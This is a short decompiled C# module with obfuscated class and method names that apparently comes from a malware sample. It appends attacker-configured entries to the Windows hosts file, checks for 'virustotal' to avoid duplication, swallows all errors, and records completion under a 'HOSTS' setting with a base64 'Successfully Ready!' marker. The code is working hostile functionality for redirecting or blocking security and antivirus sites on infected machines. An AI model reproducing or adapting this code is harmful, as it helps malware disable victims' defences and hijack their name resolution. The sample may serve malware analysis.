using System;
using System.IO;
using A;
using Microsoft.VisualBasic.CompilerServices;
using ns20;

namespace ns9;

public class GClass9
{
	public static void smethod_0()
	{
		try
		{
			if (C.b() && Operators.CompareString(C.b("HOSTS"), (string)null, false) == 0)
			{
				smethod_1();
				C.a("HOSTS", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		string string_ = GClass20.string_30;
		try
		{
			if (Operators.CompareString(string_, "0", false) != 0)
			{
				string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
				if (File.Exists(path) && !File.ReadAllText(path).Contains("virustotal"))
				{
					string contents = string_;
					File.AppendAllText(path, contents);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
